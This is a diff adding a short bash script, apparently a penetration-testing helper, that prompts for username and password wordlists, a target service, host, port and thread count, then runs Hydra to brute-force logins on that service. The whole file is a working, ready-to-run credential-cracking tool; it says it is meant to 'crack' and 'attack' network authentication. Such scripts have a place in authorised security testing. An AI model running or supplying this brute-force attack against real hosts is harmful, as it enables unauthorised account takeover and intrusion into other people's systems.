@@ -1,0 +1,18 @@
+#!/bin/bash
+# Crack Network PW. This script assumes you have NCRACK and Seclists installed
+echo "This script uses HYDRA to crack network authenication..."
+echo "Please enter location of the list of usernames (default is /usr/share/ncrack/minimal.usr): "
+read USERLIST
+echo "Please enter the password list you would like to use (default is /usr/share/seclists/Passwords/rockyou-15.txt): "
+ls "/usr/share/seclists/Passwords"
+read PASSLIST
+echo "Please enter service that you'd like to attack: "
+read SERVICE
+echo "Please enter host name: "
+read HOST
+echo "Please enter port: "
+read PORT
+echo "Please enter number of tasks (Default is 16)"
+read TASKS
+echo "Please wait...."
+hydra -L $USERLIST -P /usr/share/seclists/Passwords/$PASSLIST -t $TASKS $SERVICE://$HOST:$PORT -V
